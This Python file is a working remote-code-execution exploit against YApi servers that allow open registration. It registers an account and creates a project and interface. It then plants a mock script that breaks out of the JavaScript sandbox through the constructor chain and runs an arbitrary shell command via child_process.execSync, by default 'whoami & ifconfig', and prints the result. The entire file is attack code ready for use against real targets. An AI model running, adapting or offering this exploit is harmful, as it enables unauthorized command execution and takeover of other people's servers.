# -*- coding: utf-8 -*-

# @Time : 2021/6/23 14:13
# @Author : Deep
# @Email : deep.fn@gmail.com
# @Git : https://github.com/Deep0
# @File : yapi-mock.py

import json

import requests
import argparse

group_id = ''
project_id = ''
catid = ''
flag=1


def reg(gurl):
    global flag
    url = gurl + "/api/user/reg"
    header = {
        'Content-Type': 'application/json;charset=utf-8'
    }
    data = '{"email":"zxcc@zxcc.com","password":"zxcczxcc","username":"zxcc"}'
    rego = requests.post(url=url, headers=header, data=data)
    # print(rego.text)
    if str(400) in rego.text:
        flag = 0


session = requests.Session()


def login(gurl):
    url = gurl + "/api/user/login"
    header = {
        'Content-Type': 'application/json;charset=utf-8'
    }
    data = '{"email":"zxcc@zxcc.com","password":"zxcczxcc"}'
    logingo = session.post(url=url, headers=header, data=data)
    # print(logingo.text)
    # print(session.__dict__)


def add(gurl):
    global group_id, project_id, catid
    header = {
        'Content-Type': 'application/json;charset=utf-8'
    }
    turl = gurl + "/api/group/get_mygroup"
    t1 = session.get(url=turl)
    group_id = json.loads(t1.text)['data']['_id']
    url1 = gurl + "/api/project/add"
    data1 = '{"name":"1","basepath":"/1","group_id":"' + str(
        group_id) + '","icon":"code-o","color":"green","project_type":"private"}'
    add1 = session.post(url=url1, headers=header, data=data1)
    turl2 = gurl + "/api/project/list?group_id=" + str(group_id) + "&page=1&limit=10"
    t2 = session.get(url=turl2)
    project_id = json.loads(t2.text)['data']['list'][0]['_id']
    turl3 = gurl + "/api/interface/list_menu?project_id=" + str(project_id) + ""
    t3 = session.get(url=turl3)
    catid = json.loads(t3.text)['data'][0]['_id']
    url2 = gurl + "/api/interface/add"
    data2 = '{"method":"GET","catid":"' + str(catid) + '","title":"1","path":"/1","project_id":' + str(project_id) + '}'
    # print(data1)

    add2 = session.post(url=url2, headers=header, data=data2)
    # print(add1.text)
    # print(add2.text)


def run(gurl, exec):
    turl = gurl + "/api/interface/list?page=1&limit=20&project_id=" + str(project_id) + ""
    t1 = session.get(url=turl)
    interface_id = json.loads(t1.text)['data']['list'][0]['_id']
    url = gurl + "/api/plugin/advmock/save"
    data = '''{"project_id":"''' + str(project_id) + '''","interface_id":"''' + str(
        interface_id) + '''","mock_script":"const sandbox = this\\nconst ObjectConstructor = this.constructor\\nconst FunctionConstructor = ObjectConstructor.constructor\\nconst myfun = FunctionConstructor('return process')\\nconst process = myfun()\\nmockJson = process.mainModule.require(\\"child_process\\").execSync(\\"''' + exec + '''\\").toString()","enable":true}'''
    header = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    cmd = session.post(url=url, data=data, headers=header)
    # print(cmd.text)
    result = requests.get(url=gurl + "/mock/" + str(project_id) + "/1/1")
    print(result.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Yapi RCE , need register mode open")
    parser.add_argument('-u', '--url')
    parser.add_argument('-e', '--exec', default='whoami & ifconfig || ipconfig')
    args = parser.parse_args()
    gurl = str(args.url).rstrip('/')
    exec = args.exec
    if args.url :
        # print(gurl)
        reg(gurl)
        if flag:
            login(gurl)
            add(gurl)
            run(gurl, exec)
        else:
            print('Not support register !')
    else:
        print('Need The Target,please add -h / --help')
    # print(group_id, project_id, catid, '123')
